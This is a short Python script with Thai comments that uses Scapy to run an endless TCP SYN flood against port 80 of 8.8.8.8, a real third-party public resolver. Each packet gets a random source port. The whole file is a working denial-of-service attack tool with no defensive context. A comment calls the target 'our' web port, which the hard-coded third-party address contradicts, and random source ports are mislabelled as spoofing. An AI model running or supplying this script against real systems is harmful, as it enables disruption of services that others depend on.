from scapy.all import IP, TCP, send
import random

# ตั้งค่าเป้าหมาย
TARGET_IP = "8.8.8.8"
TARGET_PORT = 80 # ยิงไปที่พอร์ตเว็บของเราเลย

print(f"🚀 Starting TCP SYN Flood on {TARGET_IP}:{TARGET_PORT}")

try:
    while True:
        # สุ่ม Port ฝั่งคนส่ง (Spoofing)
        src_port = random.randint(1024, 65535)
        
        # สร้าง Packet: IP -> TCP (Flag=S คือ SYN)
        packet = IP(dst=TARGET_IP) / TCP(sport=src_port, dport=TARGET_PORT, flags="S")
        
        # send แบบ verbose=0 คือไม่โชว์ log รกๆ
        send(packet, verbose=0)
        print(f"⚡ Sent SYN Packet from port {src_port}", end='\r')
except KeyboardInterrupt:
    print("\n🛑 Stopped.")